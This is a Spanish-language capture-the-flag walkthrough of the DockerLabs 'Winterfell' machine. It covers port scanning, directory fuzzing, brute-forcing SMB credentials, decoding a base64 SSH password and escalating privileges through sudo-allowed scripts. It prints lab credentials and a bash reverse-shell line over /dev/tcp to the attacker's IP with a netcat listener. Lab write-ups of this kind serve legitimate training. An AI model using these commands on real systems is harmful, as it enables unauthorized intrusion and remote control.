# Winterfell

Hola, hoy voy a hacer la maquina de [DockerLabs](https://dockerlabs.es) llamada winterfell

## INTRUSIÓN

Primero iniciamos con un escaneo de puertos usando nmap:

![nmap](./images/winterfell/imagenes/nmap.png)

Vemos que los puertos abiertos son el 22, 80, 139 y 445, eso significa que tenemos ssh y smb

Puerto 80:

![Puerto80](./images/winterfell/imagenes/Puerto80.png)

ya que no se ve nada interesante hacemos fuzzing con gobuster:

"gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt":

![gobuster](./images/winterfell/imagenes/gobuster.png)

Podemos ver que hay un directorio llamado "dragon", entramos y vemos que hay un index a un archivo llamado EpisodiosT1, entramos y vemos lo siguiente:

![directoriodragon](./images/winterfell/imagenes/directoriodragon.png)

Ya que no hay nada mas intentaremos ver el puerto 443 usando smbmap, entrando de manera anonima no nos dice nada asique probaremos en meter los episodios que nos dieron en un .txt para poder intentar sacar la contraseña intentando con el usuario "jon" que salia en el puerto 80

![Contraseñajon](./images/winterfell/imagenes/Contraseñajon.png)

Vemos el usuario "jon" con contraseña "seacercaelinvierno", ahora si podemos usar smbmap con el usuario que encontramos "smbmap -H 172.17.0.2 -u jon -p seacercaelinvierno":

![SMB](./images/winterfell/imagenes/SMB.png)

luego ponemos "smbclient //172.17.0.2/shared -U jon" y nos guardamos el archivo que esta dentro con el comando "get": ![get](./images/winterfell/imagenes/get.png)

En el archivo vemos lo siguiente:

![prote](./images/winterfell/imagenes/prote.png)

asique lo metemos en un archivo y usamos el comando "base64 -d archivo.txt" para poder obtener la contraseña, y nos dirá que es "hijodelanister" suponemos que es la del ssh asique intentaremos entrar al ssh con el usuario jon y contraseña "hijodelanister", y entramos.

## ESCALADA

Ya estando dentro somos el usuario jon, por lo que ejecutaremos "sudo -l" para ver que comandos podemos ejecutar con sudo

![sudo](./images/winterfell/imagenes/sudo.png)

intentaremos modificar el archivo ".mensaje.py" usando "nano" y vemos que no esta el binario, tampoco vim, tendremos que hacerlo con echo "echo -e "import os\nos.system("/bin/bash")" > .mensaje.py" pero primero le cambiamos el nombre del archivo por cualquier otro usando "mv .mensaje.py mensaje". Luego lo ejecutamos con "sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py" y ya seremos el usuario aria.

Como aria ejecutamos "sudo -l" y vemos que podemos ejecutar con sudo:

![ariasudo](./images/winterfell/imagenes/ariasudo.png)

vemos que podemos ejecutar "cat" y "ls" como daenerys, asique intentaremos hacer un ls a "/home/danerys" y vemos lo siguiente:

![ls](./images/winterfell/imagenes/ls.png)

Usaremos cat como daenerys y vemos el mensaje

![mensaje](./images/winterfell/imagenes/mensaje.png)

Asique cambiamos de usuario con "su daenerys" y ponemos la contraseña. Ejecutamos "sudo -l" y vemos que podemos ejecutar un script que esta oculto en la home de daenerys

![daesudo](./images/winterfell/imagenes/daesudo.png)

asique listamos los directorios con "ls -la" y vamos hasta el script

![directorios](./images/winterfell/imagenes/directorios.png)

ya estando ahi vemos lo que tiene el script y lo modificamos para que nos mande una revershell a nuestra ip con "echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/(nuestra ip)/443 0>&1' > .shell.sh". Luego nos ponemos en escucha con netcat en nuestra maquina usando "nc -nlvp 443" y listo, somos el usuario root

![final](./images/winterfell/imagenes/final.png)

si queremos podemos hacer el tratamiento de la tty para quedar con un terminal mas comodo pero hasta ahi llego yo.

Este es mi primer tutorial y si no se entiende mucho perdon, tampoco soy experto y tambien estoy aprendiendo. Gracias
